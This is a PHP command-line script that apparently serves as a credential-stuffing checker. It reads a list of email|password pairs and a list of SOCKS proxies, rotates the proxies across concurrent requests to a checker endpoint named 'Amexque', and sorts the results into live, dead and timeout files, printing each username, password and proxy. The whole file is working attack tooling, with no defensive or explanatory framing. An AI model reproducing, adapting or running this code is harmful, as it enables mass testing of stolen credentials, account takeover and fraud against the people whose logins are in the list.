<?php

ini_set("memory_limit", "-1");
set_time_limit(0);
// error_reporting(0);

require_once(__DIR__ . '/vendor/autoload.php');

function save($type, $empas) {
  switch ($type) {
    case 'DIE':
      $file   = fopen('die.txt', 'a');
    break;
    case 'LIVE':
      $file   = fopen('live.txt', 'a');
    break;
    case 'TIMEOUT':
      $file   = fopen('timeout.txt', 'a');
    break;
    case 'BAD':
      $file   = fopen('result/400.txt', 'a');
    break;
    default:
      $file   = fopen('unknown.txt', 'a');
    break;
  }

  fwrite($file, $empas . PHP_EOL);
  fclose($file);
}

use \RollingCurl\RollingCurl;
use \Wujunze\Colors;

$rollingCurl = new \RollingCurl\RollingCurl();
$colors = new Wujunze\Colors();

print("\033[2J\033[;H");
echo PHP_EOL;
echo '  Path of list ex: /list.txt  : ';
$input['list']       = trim(fgets(fopen("php://stdin", "r")));
if (!file_exists($input['list'])) {
  die(' File Not Found ');
}

echo '  Path of sock ex: /sock.txt  : ';
$input['sock']       = trim(fgets(fopen("php://stdin", "r")));
if (!file_exists($input['sock'])) {
  die(' File Not Found ');
}
print("\033[2J\033[;H");

$list     = explode("\n", str_replace("\r", "", file_get_contents($input['list'])));
$list     = array_unique($list);

$sock     = explode("\n", str_replace("\r", "", file_get_contents($input['sock'])));
$chunk    = array_chunk($list, count($sock)-1);

foreach ($chunk as $key => $cot) {
  if (empty($cot)) { continue; }
  foreach ($cot as $asu => $mp) {
    if (empty($mp) || empty($sock[$asu])) { continue; }
    $rollingCurl->get('http://localhost/Amexque/a.php?empas=' . $mp . '&sock=' . $sock[$asu]);
  }
}

$rollingCurl
    ->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {

      parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);

      $json      =  json_decode($request->getResponseText());
      if (isset($json->status) && isset($json->empas)) {
        save($json->status, $json->empas);
      } else {
        save('BAD', $params['empas']);
      }

      if (isset($json->status)) {
        $username = explode('|', $json->empas)[0];
        $password = explode('|', $json->empas)[1];

        $colors = new Wujunze\Colors();

        switch ($json->status) {
          case 'TIMEOUT':
            $status   = $colors->getColoredString("TIMEOUT ", "purple", null);
          break;

          case 'DIE':
            $status   = $colors->getColoredString("DIE     ", "red", null);
          break;

          case 'LIVE':
            $status   = $colors->getColoredString("LIVE    ", "green", null);
          break;

          case '403':
            $status   = $colors->getColoredString("FORBIDEN", "cyan", null);
          break;
          default:
            $status   = $colors->getColoredString("UNKNOWN ", "cyan", null);
          break;
        }

        echo ' ' . $status;

        $mask = "%10.5s %-30.30s %-30.30s %-30.30s %-30.30s\n";
        printf($mask, '', $username, $password, $json->sock, $json->sec);
      }
    })
    ->setSimultaneousLimit(count($sock)-1)
    ->execute();
;
